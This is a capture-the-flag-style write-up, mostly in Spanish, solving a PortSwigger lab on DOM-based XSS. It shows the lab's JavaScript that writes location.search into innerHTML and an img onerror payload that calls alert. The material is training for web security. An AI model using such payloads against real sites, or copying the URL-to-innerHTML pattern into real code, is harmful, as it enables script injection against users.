# Lab: DOM XSS in `innerHTML` sink using source `location.search`

## Descripción: 
This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.
To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

## Solución:
1. Al ingresar una palabra en el buscador y al inspeccionar el código fuente de la pagina nos encoramos con la siguiente función JavaScript: 

```html
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
	    doSearchQuery(query);
    }
</script>
```

2. Usamos el siguiente payload para comprobar si existe la vulnerabilidad DOM XSS en el sitio:

```html
<img src=x onerror=alert('XSS');>
```

![Pasted image 20230627151116](Pasted%20image%2020230627151116.png)

## Notas adicionales:

El valor del atributo `src` no es válido y arroja un error. Esto activa el controlador de eventos `onerror`,que luego llama a la función `alert()`. Como resultado, el payload se ejecuta cada vez que el navegador del usuario intenta cargar la página que contiene su publicación maliciosa.

## Referencias:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#cors
- https://portswigger.net/web-security/cross-site-scripting/dom-based